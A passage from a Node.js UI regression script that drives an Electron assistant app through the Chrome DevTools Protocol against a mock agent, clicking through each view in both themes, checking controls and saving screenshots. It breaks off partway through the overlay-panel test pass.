#!/usr/bin/env node
/* Drives the real Electron app against scripts/mock-agent.js, screenshots
   every view and state in both themes, and checks on the way that the
   controls still do what they did. This is the UI's regression pass: the
   renderer has no test framework, so "it still works" means this script
   clicked it and saw the result, and "it looks right" means a person (or
   Claude) looked at the PNGs it wrote.

     node scripts/ui-capture.js --out /tmp/ui            # dark + light, 1180 and 940 wide
     node scripts/ui-capture.js --out /tmp/ui --themes dark --widths 1180
     node scripts/ui-capture.js --out /tmp/ui --no-session   # skip the ~20 s voice session
     node scripts/ui-capture.js --out /tmp/ui --panels-only  # only the overlay-panel pass
     node scripts/ui-capture.js --out /tmp/ui --no-panels    # skip it
     node scripts/ui-capture.js --out /tmp/ui --shared-only  # only the shared-skills pass (Library + skills panel)
     node scripts/ui-capture.js --out /tmp/ui --no-shared    # skip it
     node scripts/ui-capture.js --out /tmp/ui --registry     # only the shared-skills pass against the REAL agent:
       # agent/scripts/registry_e2e_check.py --fixture (a local signed registry and a
       # sandboxed agent on spare ports, no model, no sound): install, update, yank,
       # a tampered index and a share, all through the agent's own answers
     node scripts/ui-capture.js --out /tmp/ui --real ws://127.0.0.1:8794
       # against an agent that's already running (never 8765): no mock is
       # started, and only the checks that are safe on a real agent run --
       # every view opens and renders the real catalog, one preference is
       # toggled and reset, a bad voice setting is refused and reverted.
       # Nothing is sent that makes the agent act on the machine.
       # The agent's socket is authenticated: run this with LEUTHERIA_TOKEN
       # set to the token that agent was started with (or, for a standalone
       # agent that generated its own, leave it unset and the app reads the
       # agent's token file).

   It starts its own mock agent (port 8797 by default, never 8765) and its own
   Electron with an isolated userData directory, and stops exactly those two
   processes when it finishes. The app's windows do appear on screen while it
   runs. Nothing in the app's normal path knows about this script: it talks to
   the renderer over Chromium's remote-debugging port, which is only open
   because this script passed the flag. That port is unauthenticated: while
   this script runs, any local process can drive the app's renderer through
   it -- and so, with --real, send commands to that agent and answer its
   confirmations. Don't leave it running, and don't point --real at an agent
   you care about on a machine you don't trust.

   The panel pass (runPanels) starts its own Electron with
   LEUTHERIA_TEST_HOOKS=1 and --inspect on INSPECT_PORT, and drives the main
   process through its inspector: globalThis.__leutheriaTest (main.js) stands
   in for the cursor (the hot edge) and the mouse button, and reports which
   window has focus. Both exist only under that variable. It also restarts
   the app on the same userData to check the layout file persists, and
   corrupts that file on purpose.

   One line per check; exits non-zero if any failed. */

const { spawn } = require("child_process");
const fs = require("fs");
const http = require("http");
const path = require("path");
const WebSocket = require("ws");
const { childEnv, generateToken } = require("../agent-auth");

const APP_DIR = path.join(__dirname, "..");

function arg(name, fallback) {
  const index = process.argv.indexOf(`--${name}`);
  return index === -1 ? fallback : process.argv[index + 1];
}
const flag = (name) => process.argv.includes(`--${name}`);

const OUT = path.resolve(arg("out", "ui-capture"));
const THEMES = arg("themes", "dark,light").split(",");
const WIDTHS = arg("widths", "1180,940").split(",").map(Number);
const MOCK_PORT = Number(arg("mock-port", 8797));
const DEBUG_PORT = Number(arg("debug-port", 9347));
const INSPECT_PORT = Number(arg("inspect-port", 9348));
const PANELS_ONLY = flag("panels-only");
const REGISTRY_REAL = flag("registry");
const SHARED_ONLY = flag("shared-only") || REGISTRY_REAL;
const WITH_SHARED = !flag("no-shared") && !arg("real", null) && !REGISTRY_REAL;
const WITH_PANELS = !flag("no-panels") && !arg("real", null);
const REAL_URL = arg("real", null);
const WITH_SESSION = !flag("no-session") && !REAL_URL;
const HEIGHT = 780;

if (MOCK_PORT === 8765 || /:8765\b/.test(REAL_URL || "")) {
  console.error("ui-capture: refusing to use 8765, the real agent's port");
  process.exit(1);
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
let failures = 0;

function check(name, ok, detail) {
  if (!ok) failures += 1;
  console.log(`${ok ? "ok  " : "FAIL"} ${name}${detail ? ` -- ${detail}` : ""}`);
}

// --- a minimal Chrome DevTools Protocol client ------------------------------

function getJson(url) {
  return new Promise((resolve, reject) => {
    http
      .get(url, (res) => {
        let body = "";
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => {
          try {
            resolve(JSON.parse(body));
          } catch (err) {
            reject(err);
          }
        });
      })
      .on("error", reject);
  });
}

class Page {
  constructor(socket) {
    this.socket = socket;
    this.nextId = 1;
    this.waiting = new Map();
    socket.on("message", (raw) => {
      const message = JSON.parse(raw.toString());
      const entry = this.waiting.get(message.id);
      if (!entry) return;
      this.waiting.delete(message.id);
      if (message.error) entry.reject(new Error(message.error.message));
      else entry.resolve(message.result);
    });
  }

  static async attach(match, timeoutMs = 20000, port = DEBUG_PORT) {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
      try {
        const targets = await getJson(`http://127.0.0.1:${port}/json/list`);
        const target = targets.find((entry) => (match === null ? entry.type === "node" : entry.type === "page" && entry.url.includes(match)));
        if (target) {
          const socket = new WebSocket(target.webSocketDebuggerUrl);
          await new Promise((resolve, reject) => {
            socket.once("open", resolve);
            socket.once("error", reject);
          });
          return new Page(socket);
        }
      } catch (_err) {
        // the debugging port isn't up yet
      }
      await sleep(250);
    }
    throw new Error(`no page matching ${match} on the debugging port`);
  }

  send(method, params = {}) {
    const id = this.nextId++;
    return new Promise((resolve, reject) => {
      this.waiting.set(id, { resolve, reject });
      this.socket.send(JSON.stringify({ id, method, params }));
      // A page that's gone (a closed window) never answers: fail the run
      // with a reason instead of hanging it.
      setTimeout(() => {
        if (this.waiting.delete(id)) reject(new Error(`no answer to ${method} in 30 s`));
      }, 30000);
    });
  }

  async eval(expression) {
    const result = await this.send("Runtime.evaluate", {
      expression,
      awaitPromise: true,
      returnByValue: true,
    });
    if (result.exceptionDetails) {
      throw new Error(`page threw: ${result.exceptionDetails.exception?.description || result.exceptionDetails.text}`);
    }
    return result.result.value;
  }

  async waitFor(expression, timeoutMs = 8000) {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
      // A throw means "not yet" (the page may still be loading), not a failure.
      if (await this.eval(`(() => { try { return Boolean(${expression}); } catch (_err) { return false; } })()`)) return true;
      await sleep(120);
    }
    return false;
  }

  async size(width, height) {
    await this.send("Emulation.setDeviceMetricsOverride", { width, height, deviceScaleFactor: 2, mobile: false });
  }

  async shot(file) {
    await sleep(350); // let transitions settle
    const { data } = await this.send("Page.captureScreenshot", { format: "png" });
    fs.writeFileSync(file, Buffer.from(data, "base64"));
  }
}

// --- page helpers (strings evaluated in the renderer) ------------------------

const clickNav = (index) => `document.querySelectorAll("#nav button")[${index}].click()`;
const NAV = { assistant: 0, library: 1, activity: 2, permissions: 3, voice: 4, overlay: 5, logs: 6 };

const typeCommand = (text) => `(() => {
  const input = document.getElementById("command-input");
  input.value = ${JSON.stringify(text)};
  input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
})()`;

// Click the first element matching `selector` whose text is exactly `text`.
const clickText = (selector, text, root = "document") => `(() => {
  const node = [...${root}.querySelectorAll(${JSON.stringify(selector)})].find((n) => n.textContent.trim() === ${JSON.stringify(text)});
  if (!node) return false;
  node.click();
  return true;
})()`;

const setInput = (selector, value) => `(() => {
  const input = document.querySelector(${JSON.stringify(selector)});
  if (!input) return false;
  input.value = ${JSON.stringify(value)};
  input.dispatchEvent(new Event("input", { bubbles: true }));
  return true;
})()`;

// --- one theme, start to finish ----------------------------------------------

async function runTheme(theme) {
  const dir = path.join(OUT, theme);
  fs.mkdirSync(dir, { recursive: true });
  const file = (name) => path.join(dir, `${name}.png`);
  const children = [];

  // The mock is given a fresh token and checks it, so every run exercises
  // the app's real authentication path (main.js -> agent-auth.js). Against a
  // real agent (--real) the token is that agent's: LEUTHERIA_TOKEN from this
  // script's environment, passed through to Electron unchanged.
  const token = REAL_URL ? process.env.LEUTHERIA_TOKEN : generateToken();
  if (!REAL_URL) {
    const mock = spawn(process.execPath, [path.join(__dirname, "mock-agent.js")], {
      env: {
        ...childEnv(token),
        MOCK_PORT: String(MOCK_PORT),
        MOCK_AUTOSTART: "0",
        MOCK_CONFIRM_TIMEOUT_MS: "15000",
        MOCK_TIMEOUT_MS: "2500",
        // The second theme's session asks for a click, not a spoken yes.
        MOCK_VOICE_APPROVABLE: theme === THEMES[0] ? "1" : "0",
      },
      stdio: "ignore",
    });
    children.push(mock);
  }

  const env = {
    ...childEnv(token),
    LEUTHERIA_AGENT_URL: REAL_URL || `ws://127.0.0.1:${MOCK_PORT}`,
    LEUTHERIA_NO_SPAWN: "1",
    // Isolates userData and keeps an occluded window painting (main.js).
    LEUTHERIA_CAPTURE_DIR: path.join(dir, "_state"),
    LEUTHERIA_CAPTURE_THEME: theme,
  };
  delete env.ELECTRON_RUN_AS_NODE;
  fs.rmSync(env.LEUTHERIA_CAPTURE_DIR, { recursive: true, force: true });
  const electron = spawn(require("electron"), [".", `--remote-debugging-port=${DEBUG_PORT}`], {
    cwd: APP_DIR,
    env,
    stdio: "ignore",
  });
  children.push(electron);

  try {
    const main = await Page.attach("renderer/index.html");
    await main.size(WIDTHS[0], HEIGHT);
    check(`[${theme}] agent connects`, await main.waitFor(`document.getElementById("status").dataset.state === "connected"`, 15000));
    await main.waitFor(`window.LX && LX.state.inventory`, 8000);

    // --- theme toggle
    if (theme === "light") await main.eval(`document.getElementById("theme-toggle").click()`);
    // The theme is an appearance setting now (overlay-layout.json), not
    // this window's localStorage.
    check(
      `[${theme}] theme toggle sets and persists the theme`,
      (await sleep(300)) ||
        (await main.eval(
          `(async () => document.documentElement.dataset.theme === "${theme}" && (await window.leutheria.getOverlaySettings()).settings.appearance.theme === "${theme}")()`
        ))
    );

    if (REAL_URL) {
      await runReal(main, theme, file);
      return;
    }

    // --- assistant
    await main.shot(file("assistant-empty"));
    check(
      `[${theme}] the autofocused composer rests quietly`,
      await main.eval(`document.activeElement.id === "command-input" && document.body.dataset.modality !== "keyboard"`)
    );
    await main.send("Input.dispatchKeyEvent", { type: "keyDown", key: "Tab", code: "Tab", windowsVirtualKeyCode: 9 });
    await main.send("Input.dispatchKeyEvent", { type: "keyUp", key: "Tab", code: "Tab", windowsVirtualKeyCode: 9 });
    await main.eval(`document.getElementById("command-input").focus()`);
    check(`[${theme}] keyboard focus switches the composer to the focus ring`, await main.eval(`document.body.dataset.modality === "keyboard"`));
    await main.shot(file("assistant-empty-keyboard-focus"));
    await main.eval(`document.dispatchEvent(new PointerEvent("pointerdown"))`);
    await main.eval(typeCommand("what time is it"));
    check(`[${theme}] typed command gets a reply`, await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length === 1`));
    await main.eval(typeCommand("this one will fail"));
    await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length === 2`);
    check(`[${theme}] failed trace step is marked`, await main.eval(`Boolean(document.querySelector("#chat .trace-step.failed"))`));
    await main.eval(typeCommand("error please"));
    await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length === 3`);
    check(`[${theme}] error reply is marked`, await main.eval(`Boolean(document.querySelector("#chat .msg-body.error"))`));
    await main.shot(file("assistant-transcript"));

    await main.eval(typeCommand("confirm this"));
    check(`[${theme}] confirmation card appears`, await main.waitFor(`document.querySelector("#chat .prompt-card.confirm .prompt-actions")`));
    check(
      `[${theme}] confirmation card has its four buttons`,
      (await main.eval(`document.querySelectorAll("#chat .prompt-card.confirm .prompt-actions button").length`)) === 4
    );
    await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
    await main.shot(file("confirm-card"));
    await main.eval(clickText("#chat .prompt-card.confirm button", "Approve for this session"));
    check(
      `[${theme}] approving settles the card and the reply follows`,
      (await main.waitFor(`document.querySelector("#chat .prompt-card.confirm .prompt-resolved")`)) &&
        (await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length === 4`))
    );

    await main.eval(typeCommand("propose a skill"));
    check(`[${theme}] skill proposal card appears`, await main.waitFor(`document.querySelector("#chat .prompt-card.proposal .prompt-actions")`));
    await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
    await main.shot(file("proposal-card"));
    await main.eval(`document.querySelectorAll("#chat .prompt-card.proposal .choice")[1].click()`);
    check(
      `[${theme}] proposal choice switches`,
      await main.eval(
        `(() => { const c = document.querySelectorAll("#chat .prompt-card.proposal .choice"); return !c[0].classList.contains("selected") && c[1].classList.contains("selected"); })()`
      )
    );
    await main.eval(clickText("#chat .prompt-card.proposal button", "Save skill"));
    check(
      `[${theme}] saving a proposal settles the card and confirms in chat`,
      (await main.waitFor(`document.querySelector("#chat .prompt-card.proposal .prompt-resolved")`)) &&
        (await main.waitFor(`[...document.querySelectorAll("#chat .msg-body")].some((n) => /Saved "summarize_project/.test(n.textContent))`))
    );
    check(
      `[${theme}] no emoji in the transcript`,
      await main.eval(`!/[\\u2600-\\u27BF\\u{1F300}-\\u{1FAFF}\\uFE0F]/u.test(document.getElementById("chat").textContent)`)
    );
    await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
    await main.shot(file("proposal-saved"));

    // A confirmation nobody answers: a 300-character command, a reason, and
    // voice_approvable:false; the agent times it out (by:"timeout").
    await main.eval(typeCommand("let this one timeout"));
    check(
      `[${theme}] a confirmation shows its reason and that it needs a click`,
      (await main.waitFor(`[...document.querySelectorAll("#chat .prompt-card.confirm")].pop()?.querySelector(".needs-click")`)) &&
        (await main.eval(`/outside your usual folders/.test([...document.querySelectorAll("#chat .prompt-card.confirm")].pop().querySelector(".prompt-reason")?.textContent || "")`))
    );
    await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
    await main.shot(file("confirm-card-long-needs-click"));
    check(
      `[${theme}] a timed-out confirmation says so and settles`,
      (await main.waitFor(`/Timed out with no answer/.test([...document.querySelectorAll("#chat .prompt-card.confirm")].pop().querySelector(".prompt-resolved")?.textContent || "")`, 6000)) &&
        (await main.waitFor(`[...document.querySelectorAll("#chat .msg-body")].some((n) => /didn't run it/.test(n.textContent))`))
    );
    await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
    await main.shot(file("confirm-timeout"));

    // --- library
    await main.eval(clickNav(NAV.library));
    check(`[${theme}] library lists the catalog`, await main.waitFor(`document.querySelectorAll("#library-list .list-row").length >= 13`));
    await main.shot(file("library-list"));
    await main.eval(clickText("#library-list .list-row-name", "run_command"));
    await main.shot(file("library-detail-tool"));
    await main.eval(clickText("#library-list .list-row-name", "list_dir"));
    await main.eval(`document.querySelector("#library-detail .switch").click()`);
    check(
      `[${theme}] disabling a tool round-trips`,
      (await main.waitFor(`document.querySelector("#library-detail .switch").getAttribute("aria-checked") === "false"`)) &&
        (await main.waitFor(`document.querySelector("#library-detail .setting-note")`))
    );
    await main.shot(file("library-detail-disabled"));
    await main.eval(clickText("#library-detail .link-button", "Reset"));
    check(
      `[${theme}] Reset restores the default`,
      await main.waitFor(`document.querySelector("#library-detail .switch").getAttribute("aria-checked") === "true"`)
    );
    await main.eval(clickText("#library-list .list-row-name", "archive_downloads"));
    await main.shot(file("library-detail-skill"));
    await main.eval(`document.getElementById("library-detail").scrollTop = 1e6`);
    await main.shot(file("library-detail-skill-bottom"));
    await main.eval(clickText("#view-actions .segmented button", "Skills"));
    check(
      `[${theme}] Skills filter hides tools`,
      await main.eval(`(() => { const rows = [...document.querySelectorAll("#library-list .list-row")]; return rows.length > 0 && rows.every((n) => n.dataset.kind === "skill"); })()`)
    );
    await main.eval(clickText("#view-actions .segmented button", "All"));
    await main.eval(setInput("#view-actions .search input", "file"));
    check(
      `[${theme}] search narrows the list`,
      await main.eval(`(() => { const n = document.querySelectorAll("#library-list .list-row").length; return n > 0 && n < 8; })()`)
    );
    await main.shot(file("library-search"));
    await main.eval(setInput("#view-actions .search input", "zzzz"));
    check(`[${theme}] search with no matches says so`, await main.eval(`/No matches/.test(document.getElementById("library-list").textContent)`));
    await main.shot(file("library-no-matches"));
    await main.eval(setInput("#view-actions .search input", ""));

    // --- a settings file the agent couldn't read (inventory.settings_errors)
    await main.eval(clickNav(NAV.assistant));
    await main.eval(typeCommand("break settings"));
    await main.waitFor(`[...document.querySelectorAll("#chat .msg-body")].some((n) => /unreadable/.test(n.textContent))`);
    await main.eval(`LX.app.refresh()`);
    await main.eval(clickNav(NAV.library));
    check(`[${theme}] a settings error heads the Library`, await main.waitFor(`!document.getElementById("settings-errors").hidden && /preferences.json/.test(document.getElementById("settings-errors").textContent)`));
    await main.shot(file("library-settings-error"));
    await main.eval(clickNav(NAV.permissions));
    check(`[${theme}] ...and Permissions`, await main.eval(`!document.getElementById("settings-errors").hidden`));
    await main.shot(file("permissions-settings-error"));
    await main.eval(clickNav(NAV.activity));
    check(`[${theme}] ...and not the other views`, await main.eval(`document.getElementById("settings-errors").hidden`));
    await main.eval(clickNav(NAV.assistant));
    await main.eval(typeCommand("fix settings"));
    await main.waitFor(`[...document.querySelectorAll("#chat .msg-body")].some((n) => /reads again/.test(n.textContent))`);
    await main.eval(`LX.app.refresh()`);
    await main.eval(clickNav(NAV.library));
    check(`[${theme}] the notice clears when the file is fixed`, await main.waitFor(`document.getElementById("settings-errors").hidden`));

    // --- activity
    await main.eval(clickNav(NAV.activity));
    check(`[${theme}] activity renders history and usage`, await main.waitFor(`document.querySelector("#activity-body .event") && document.querySelector("#activity-body .usage-row")`));
    await main.shot(file("activity"));

    // --- permissions
    await main.eval(clickNav(NAV.permissions));
    await main.waitFor(`document.querySelector("#permissions-body .trust-row")`);
    await main.shot(file("permissions"));
    const rowsBefore = await main.eval(`document.querySelectorAll("#permissions-body .trust-row").length`);
    await main.eval(clickText("#permissions-body .trust-row button", "Revoke"));
    check(
      `[${theme}] Revoke removes the row and toasts`,
      (await main.waitFor(`document.querySelectorAll("#permissions-body .trust-row").length === ${rowsBefore - 1}`)) &&
        (await main.waitFor(`document.querySelector("#toasts .toast")`))
    );
    await main.shot(file("permissions-revoked-toast"));

    // --- voice settings
    await main.eval(clickNav(NAV.voice));
    check(`[${theme}] voice settings load`, await main.waitFor(`document.querySelector('#voice-body [data-key="endpoint_silence_ms"] input')`));
    await main.shot(file("voice-settings"));
    await main.eval(`document.getElementById("view-voice").scrollTop = 1e6`);
    await main.shot(file("voice-settings-bottom"));
    await main.eval(setInput('#voice-body [data-key="endpoint_silence_ms"] input', "100"));
    check(
      `[${theme}] an edit enables Save and Revert`,
      await main.eval(`[...document.querySelectorAll("#view-actions button")].every((b) => !b.disabled)`)
    );
    await main.eval(clickText("#view-actions button", "Save changes"));
    check(
      `[${theme}] the agent's refusal is shown on the field it names`,
      (await main.waitFor(`document.querySelector("#voice-body .callout-danger")`)) &&
        (await main.eval(`/between 240 and 5000/.test(document.querySelector('#voice-body [data-key="endpoint_silence_ms"] .field-error')?.textContent || "")`))
    );
    await main.eval(`document.querySelector('#voice-body [data-key="endpoint_silence_ms"]').scrollIntoView({ block: "center" })`);
    await main.shot(file("voice-settings-error"));
    await main.eval(clickText("#view-actions button", "Revert"));
    check(
      `[${theme}] Revert drops the edit and the error`,
      await main.eval(
        `!document.querySelector("#voice-body .callout-danger") && document.querySelector('#voice-body [data-key="endpoint_silence_ms"] input').value === "800"`
      )
    );
    await main.eval(setInput('#voice-body [data-key="endpoint_silence_ms"] input', "900"));
    await main.eval(clickText("#view-actions button", "Save changes"));
    check(
      `[${theme}] a valid edit saves`,
      (await main.waitFor(`[...document.querySelectorAll("#toasts .toast")].some((n) => /Voice settings saved/.test(n.textContent))`)) &&
        (await main.eval(`[...document.querySelectorAll("#view-actions button")].every((b) => b.disabled)`))
    );
    check(`[${theme}] toasts clear themselves`, await main.waitFor(`document.querySelectorAll("#toasts .toast").length === 0`, 6000));

    // --- logs
    await main.eval(clickNav(NAV.logs));
    check(`[${theme}] logs show the bridge stream`, await main.waitFor(`/\\[bridge\\]/.test(document.getElementById("logs").textContent)`));
    check(`[${theme}] log lines are rows with a tinted source tag`, await main.eval(`Boolean(document.querySelector("#logs .log-line.log-bridge .log-tag"))`));
    await main.shot(file("logs"));
    await main.eval(clickText("#view-actions button", "Copy"));
    // The clipboard may refuse an unfocused window; either way the button answers.
    check(`[${theme}] Copy answers with a toast`, await main.waitFor(`/Copied|Couldn't copy/.test(document.getElementById("toasts").textContent)`));
    await main.shot(file("logs-copied"));
    await main.eval(clickText("#view-actions button", "Clear"));
    check(`[${theme}] Clear empties the log`, await main.eval(`document.querySelectorAll("#logs .log-line").length === 0`));

    // --- transcript edge cases
    await main.eval(clickNav(NAV.assistant));
    const replies = () => main.eval(`document.querySelectorAll("#chat .msg.assistant").length`);
    await main.eval(typeCommand("unsaved skill"));
    check(
      `[${theme}] skill_save_failed shows as an error line`,
      await main.waitFor(`[...document.querySelectorAll("#chat .msg-body.error")].some((n) => /Couldn't save "tidy_screenshots"/.test(n.textContent))`)
    );
    let before = await replies();
    await main.eval(typeCommand("日本語のファイルを開いて, открой файл, افتح الملف, 한국어"));
    await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length > ${before}`);
    await main.shot(file("transcript-non-latin"));
    if (theme === THEMES[0]) {
      // Long transcript: ~200 entries, sent one at a time like a person would.
      const start = Date.now();
      for (let index = 0; index < 90; index += 1) {
        before = await replies();
        await main.eval(typeCommand(`command number ${index + 1}`));
        await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length > ${before}`, 3000);
      }
      const entries = await main.eval(`document.querySelectorAll("#chat .msg").length`);
      check(`[${theme}] a long transcript renders`, entries >= 200, `${entries} entries in ${Math.round((Date.now() - start) / 1000)} s`);
      check(`[${theme}] ...and follows the newest entry`, await main.eval(`(() => { const s = document.getElementById("chat-scroll"); return s.scrollHeight - s.scrollTop - s.clientHeight < 80; })()`));
      // Scrolled back to read: an arriving reply must not yank the view down.
      before = await replies();
      await main.eval(typeCommand("one more"));
      await main.eval(`document.getElementById("chat-scroll").scrollTop = 0`);
      await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length > ${before}`);
      check(`[${theme}] a reply doesn't scroll away from what you're reading`, await main.eval(`document.getElementById("chat-scroll").scrollTop < 100`));
      const frame = await main.eval(`(() => { const t = performance.now(); document.getElementById("chat-scroll").scrollTop = 1e6; document.body.offsetHeight; return performance.now() - t; })()`);
      check(`[${theme}] scrolling the long transcript stays cheap`, frame < 50, `${frame.toFixed(1)} ms layout`);
      await main.shot(file("transcript-long"));
    }

    // --- Library: a learned skill with a long name and 40 steps, then delete it
    const LONG = "export_quarterly_reports_to_the_shared_finance_drive_and_notify_the_team";
    await main.eval(clickNav(NAV.library));
    await main.eval(clickText("#library-list .list-row-name", LONG));
    check(`[${theme}] a 40-step learned skill lists every step`, await main.waitFor(`document.querySelectorAll("#library-detail .step").length === 40`));
    await main.shot(file("library-detail-long-skill"));
    await main.eval(`document.getElementById("library-detail").scrollTop = 1e6`);
    await main.shot(file("library-detail-long-skill-bottom"));
    await main.eval(clickText("#library-detail .danger-zone button", "Delete"));
    check(`[${theme}] Delete asks first`, await main.waitFor(`/This can't be undone/.test(document.querySelector("#library-detail .danger-zone").textContent)`));
    await main.shot(file("library-delete-confirm"));
    await main.eval(clickText("#library-detail .danger-zone button", "Delete skill"));
    check(
      `[${theme}] a deleted skill leaves the list, with a toast`,
      (await main.waitFor(`![...document.querySelectorAll("#library-list .list-row")].some((n) => n.dataset.name === "${LONG}")`)) &&
        (await main.waitFor(`/Deleted/.test(document.getElementById("toasts").textContent)`))
    );
    await main.shot(file("library-deleted-toast"));

    // --- reduced motion: toasts must still go away
    await main.send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "reduce" }] });
    await main.waitFor(`document.querySelectorAll("#toasts .toast").length === 0`, 6000);
    await main.eval(`LX.toast("Reduced motion check")`);
    check(`[${theme}] under reduced motion a toast still clears`, await main.waitFor(`document.querySelectorAll("#toasts .toast").length === 0`, 5000));
    await main.send("Emulation.setEmulatedMedia", { features: [] });

    // --- every view again at the other widths
    for (const width of WIDTHS.slice(1)) {
      await main.size(width, HEIGHT);
      for (const [name, index] of Object.entries(NAV)) {
        await main.eval(clickNav(index));
        if (name === "library") await main.eval(clickText("#library-list .list-row-name", "archive_downloads"));
        if (name === "assistant") await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
        await main.shot(file(`w${width}-${name}`));
        check(
          `[${theme}] ${name} at ${width}px has no horizontal overflow`,
          await main.eval(`document.documentElement.scrollWidth <= window.innerWidth && document.querySelector(".main").scrollWidth <= document.querySelector(".main").clientWidth`)
        );
      }
      await main.size(WIDTHS[0], HEIGHT);
    }

    // --- the voice session: pill, overlay, confirmation from either window
    if (WITH_SESSION) {
      await main.eval(clickNav(NAV.assistant));
      await main.eval(`document.getElementById("voice-indicator").click()`);
      check(`[${theme}] voice pill starts a session`, await main.waitFor(`document.getElementById("voice-indicator").dataset.state === "listening"`, 6000));
      await main.shot(file("voice-pill-listening"));

      const overlay = await Page.attach("overlay/overlay.html");
      await overlay.size(460, 300);
      // The window is transparent; give the screenshot something to sit on.
      const backdrop = theme === "dark" ? { r: 34, g: 36, b: 44, a: 1 } : { r: 214, g: 216, b: 222, a: 1 };
      await overlay.send("Emulation.setDefaultBackgroundColorOverride", { color: backdrop });
      check(`[${theme}] overlay follows the theme`, await overlay.eval(`document.documentElement.dataset.theme === "${theme}"`));

      const seen = new Set();
      const answerFromOverlay = theme === THEMES[0];
      const deadline = Date.now() + 45000;
      let answered = false;
      while (Date.now() < deadline) {
        const state = await overlay.eval(
          `document.body.classList.contains("leaving") ? "ended" : document.getElementById("island").dataset.state`
        );
        if (state === "ended" && seen.size) break;
        if (state !== "ended" && !seen.has(state)) {
          seen.add(state);
          await overlay.shot(file(`overlay-${state}`));
        }
        const cardUp = await overlay.eval(`!document.getElementById("confirm").hidden && document.querySelectorAll("#confirm-actions button").length === 2`);
        // Answer only once the session is waiting on it, so the reticle's
        // awaiting_confirmation state is reached and captured first.
        if (cardUp && !answered && state === "awaiting_confirmation") {
          answered = true;
          check(
            `[${theme}] the overlay card's hint matches voice_approvable`,
            await overlay.eval(
              theme === THEMES[0]
                ? `!document.getElementById("confirm-hint").classList.contains("click-only")`
                : `document.getElementById("confirm-hint").classList.contains("click-only") && !document.getElementById("confirm-reason").hidden`
            )
          );
          await overlay.shot(file("overlay-confirm-card"));
          await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
          await main.shot(file("voice-session-confirm"));
          if (answerFromOverlay) {
            await overlay.eval(clickText("#confirm-actions button", "Approve"));
            check(
              `[${theme}] a confirmation answered on the overlay settles the main card`,
              await main.waitFor(`/from the overlay/.test([...document.querySelectorAll("#chat .prompt-resolved")].pop()?.textContent || "")`)
            );
          } else {
            await main.eval(`[...document.querySelectorAll("#chat .prompt-card.confirm")].pop().querySelector("button").click()`);
            check(
              `[${theme}] a confirmation answered in the main window settles the overlay card`,
              await overlay.waitFor(`/main window/.test(document.querySelector(".ov-confirm-resolved")?.textContent || "")`)
            );
          }
          check(`[${theme}] a settled overlay card goes neutral`, await overlay.eval(`document.getElementById("confirm").classList.contains("resolved")`));
          await overlay.shot(file("overlay-confirm-settled"));
        }
        await sleep(150);
      }
      const expected = ["listening", "hearing", "transcribing", "thinking", "speaking", "awaiting_confirmation"];
      check(`[${theme}] overlay showed every state`, expected.every((state) => seen.has(state)), [...seen].join(", "));
      check(`[${theme}] the session's confirmation was answered`, answered);
      check(
        `[${theme}] the session's reply reaches the transcript`,
        await main.waitFor(`[...document.querySelectorAll("#chat .msg-body")].some((n) => /build folder is gone/.test(n.textContent))`, 12000)
      );
      await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
      await main.shot(file("voice-session-reply"));
      check(`[${theme}] the pill returns to idle when the session ends`, await main.waitFor(`document.getElementById("voice-indicator").dataset.state === "idle"`, 15000));
    }
    if (!REAL_URL && children[0]) {
      children[0].kill();
      check(
        `[${theme}] losing the agent shows in the status`,
        await main.waitFor(`["disconnected", "error"].includes(document.getElementById("status").dataset.state)`, 6000)
      );
      await main.eval(clickNav(NAV.library));
      await main.shot(file("status-disconnected"));
    }
  } finally {
    for (const child of children) child.kill();
    await sleep(800);
  }
}

// --- overlay panels -------------------------------------------------------------

const { execFileSync } = require("child_process");

/** The frontmost app's name, from LaunchServices (no permissions needed). */
function frontmostApp() {
  try {
    const asn = execFileSync("lsappinfo", ["front"]).toString().trim();
    return execFileSync("lsappinfo", ["info", "-only", "name", asn]).toString().trim();
  } catch (_err) {
    return null;
  }
}

async function runPanels(theme) {
  const dir = path.join(OUT, theme, "panels");
  fs.mkdirSync(dir, { recursive: true });
  const file = (name) => path.join(dir, `${name}.png`);
  const stateDir = path.join(dir, "_state");
  const layoutFile = path.join(stateDir, "userdata", "overlay-layout.json");
  fs.rmSync(stateDir, { recursive: true, force: true });
  const token = generateToken();
  const T = `[${theme}] panels:`;
  const backdrop = theme === "dark" ? { r: 34, g: 36, b: 44, a: 1 } : { r: 214, g: 216, b: 222, a: 1 };

  const mock = spawn(process.execPath, [path.join(__dirname, "mock-agent.js")], {
    env: { ...childEnv(token), MOCK_PORT: String(MOCK_PORT), MOCK_AUTOSTART: "0", MOCK_CONFIRM_TIMEOUT_MS: "4000" },
    stdio: "ignore",
  });
  let electron = null;
  const env = {
    ...childEnv(token),
    LEUTHERIA_AGENT_URL: `ws://127.0.0.1:${MOCK_PORT}`,
    LEUTHERIA_NO_SPAWN: "1",
    LEUTHERIA_CAPTURE_DIR: stateDir,
    LEUTHERIA_CAPTURE_THEME: theme,
    LEUTHERIA_TEST_HOOKS: "1",
  };
  delete env.ELECTRON_RUN_AS_NODE;

  async function launch() {
    electron = spawn(require("electron"), [".", `--remote-debugging-port=${DEBUG_PORT}`, `--inspect=${INSPECT_PORT}`], {
      cwd: APP_DIR,
      env,
      stdio: "ignore",
    });
    const hooks = await Page.attach(null, 20000, INSPECT_PORT);
    await hooks.waitFor(`globalThis.__leutheriaTest`, 15000);
